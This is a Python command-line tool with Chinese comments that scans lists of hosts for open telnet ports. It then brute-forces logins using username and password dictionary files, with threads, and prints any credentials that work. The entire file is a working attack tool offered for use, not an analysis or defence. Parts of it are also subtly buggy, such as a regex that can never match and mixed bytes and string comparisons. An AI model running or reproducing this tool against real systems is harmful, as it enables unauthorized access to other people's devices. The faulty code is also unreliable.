#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2019-05-29 20:13:27
# @Author  : crhua 

import sys
import socket
import telnetlib
import re
import time
from threading import Thread
from optparse import OptionParser


"""
brute telnet login
"""
def brute(ip,port,users,passwds):
	for u in users:
		for p in passwds:
			u = u.strip()
			p = p.strip()
			print(p)
			try:
				tn = telnetlib.Telnet(ip,port,timeout=5)
				os = tn.read_some()
			except Exception as e:
				print(e)
				return 3
			user_match = "(?i)(login|user|username)"
			passwd_match = "(?!)(login|user|username)"
			login_match = "#|\$|>"
			if re.search(user_match, os):
				try:
					tn.write(u.encode()+b"\r\n")
					tn.read_until(passwd_match,timeout=2)
					tn.write(p.encode()+b"\r\n")
					login_info = tn.read_until(login_match,timeout=3)
					tn.close()
					if re.search(login_match, login_info):
						print("[+] success:{0}:{1}存在telnet口令{2}：{3}".format(ip,port,u,p))
				except Exception as e:
					print(e)


def brute_1(ip,port,users,passwds):
	for u in users:
		for p in passwds:
			u = u.strip()
			p = p.strip()
			print(p)
			try:
				tn = telnetlib.Telnet(ip,port,timeout=3)
				tn.set_debuglevel(2)
				tn.read_until(b'login: ')
				tn.write(u.encode(encoding='utf-8') + b'\n')
				tn.read_until(b'password: ')
				tn.write(p.encode(encoding='utf-8') + b'\n')
				time.sleep(2)
				res = tn.read_very_eager()
				print(res)
				if 'Login incorrect' not in res:
					print("success:{0}:{1}".format(u,p))
				else:
					print("eerr")
				tn.close()
			except Exception as e:
				print(e)
				# pass



"""
多个目标
"""
def run(func,threadnum,ips,port,user_dic,passwd_dic):
	for i in range(1,threadnum + 1):
		threads = [Thread(target=func,args=(u,port,user_dic,passwd_dic,)) for u in ips]
	for t in threads:
		t.start()
	for t in threads:
		t.join()

"""
扫描开放端口
"""
def scan(ip,port,filename):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(2)
	try:
		res = s.connect_ex((ip,int(port)))
		if res == 0:
			with open(filename,'a+') as f:
				f.write("{0}\n".format(ip))
	except:
		pass


if __name__ == '__main__':
	#帮助
	usage = "Usage: python %prog [options] args"
	parser = OptionParser(usage,version="%prog 0.1 ")
	parser.add_option("-t", dest="host", help="target host")
	parser.add_option("-p", dest="port", default="23", help="target port")
	parser.add_option("-u", dest="user", help="user dic")
	parser.add_option("-P", dest="passwd", help="passwd dic")
	parser.add_option("-a", dest="hosts" , help="target hosts file")
	options,args = parser.parse_args()

	"""
	获取用户参数 -u -P -p
	"""
	if options.user:
		user = options.user
	else:
		print("Please specify -u parameters")
		sys.exit(0)

	if options.passwd:
		passwd = options.passwd
	else:
		print("Please specify -P parameters")
		sys.exit(0)

	if options.port:
		port = options.port

	"""
	tmp_list 存放所有文件内的ip
	last_list 存放只开放telnet的ip
	result 结果存放列表
	threadnum 多线程数量
	"""
	tmp_list = []
	last_list = []
	result = []
	threadnum = 10

	with open(user,'r') as f:
		users = f.readlines()
	with open(passwd,'r') as g:
		passwds = g.readlines()
	f.close()
	g.close()

	if options.host:
		host = options.host
		brute_1(host,port,users,passwds)
	elif options.hosts:
		file_path = options.hosts
		with open(file_path,'r') as f:
			_tmp = f.readlines()
		for i in _tmp:
			i = i.strip()
			tmp_list.append(i)
		f.close()
		# print(tmp_list)
		"""
		多线程获取端口开放
		"""
		file_name = "{0}_telnet.txt".format(port)
		for i in range(10):
			threads = [Thread(target=scan,args=(u,port,file_name,)) for u in tmp_list]
		for t in threads:
			t.start()
		for t in threads:
			t.join()
		print(file_name)

		"""
		暴力破解telnet
		"""
		with open(file_name,'r') as f:
			_last = f.readlines()
		for i in _last:
			i = i.strip()
			last_list.append(i)
		run(brute,threadnum,last_list,port,users, passwds)
	else:
		print("Error! Please use -h param")

	for m in result:
		print(m)


		

